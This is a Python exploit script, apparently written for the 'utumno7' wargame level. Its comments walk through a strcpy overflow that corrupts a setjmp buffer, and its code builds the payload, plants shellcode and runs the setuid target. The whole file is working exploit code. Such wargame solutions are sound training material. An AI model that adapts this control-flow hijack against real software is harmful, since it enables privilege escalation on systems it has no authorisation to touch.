import ctypes, os, struct, sys, time

# ---------------------------------------------------------------------------
# utumno7's vuln():
#
#     char buffer[0x120];                  /* buffer at ebp-0x120 */
#     jbp = buffer + 0x80;                 /* the jmp_buf at ebp-0xa0 */
#     ret = _setjmp(jbp);                  /* saves {ebx,esi,edi,ebp,esp,eip} */
#     if (ret == 0) {
#         strcpy(buffer, arg);             /* unbounded copy */
#         jmp(23);                         /* longjmp(jbp, 23) */
#     }
#
# _setjmp stores the context in the middle of the buffer, so the overflow
# passes over it.  The jmp_buf layout on this glibc is
#   +0 ebx, +4 esi, +8 edi, +12 ebp, +16 esp, +20 eip.
# A 144-byte payload fills buffer[0..143]: buffer[140..143] becomes our fake
# ebp, and strcpy's NUL lands at buffer[144] -- the low byte of the saved esp,
# which longjmp does not need.  longjmp then restores ebp = our fake value,
# and vuln's "leave; ret" reads buffer[0..3] as the new ebp and buffer[4..7]
# as the return address, which we point at the shellcode at buffer+8.
# ---------------------------------------------------------------------------
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.execve.argtypes = [ctypes.c_char_p,
                        ctypes.POINTER(ctypes.c_char_p),
                        ctypes.POINTER(ctypes.c_char_p)]

sc = open("/tmp/uu7/sc.bin", "rb").read()
print("shellcode: %d bytes, NUL: %s" % (len(sc), b"\x00" in sc), flush=True)

# measured in gdb with this exact payload size (see the recording)
BUF = 0xffffdc5c

def build(B):
    a = bytearray(b"\x90" * 144)
    a[0:4] = struct.pack("<I", B)            # new ebp for leave
    a[4:8] = struct.pack("<I", B + 8)        # ret -> shellcode at buffer+8
    a[8:8 + len(sc)] = sc
    a[140:144] = struct.pack("<I", B)        # the ebp longjmp restores
    return bytes(a)

def run(B):
    argv = (ctypes.c_char_p * 3)(b"/utumno/utumno7", build(B), None)
    env = (ctypes.c_char_p * 1)(None)
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1); os.dup2(w, 2); os.close(w)
        devnull = os.open("/dev/null", os.O_RDONLY); os.dup2(devnull, 0)
        libc.execve(b"/utumno/utumno7",
                    ctypes.cast(argv, ctypes.POINTER(ctypes.c_char_p)),
                    ctypes.cast(env, ctypes.POINTER(ctypes.c_char_p)))
        os._exit(1)
    os.close(w)
    out = b""
    end = time.time() + 1.0
    while time.time() < end:
        try:
            chunk = os.read(r, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    os.close(r)
    os.waitpid(pid, 0)
    return out

out = run(BUF)
if b"PWN!" not in out:
    print("no marker; output was %r" % out[:40])
    sys.exit(1)
print(out.split(b"PWN!")[1][:40].decode("latin-1"), flush=True)
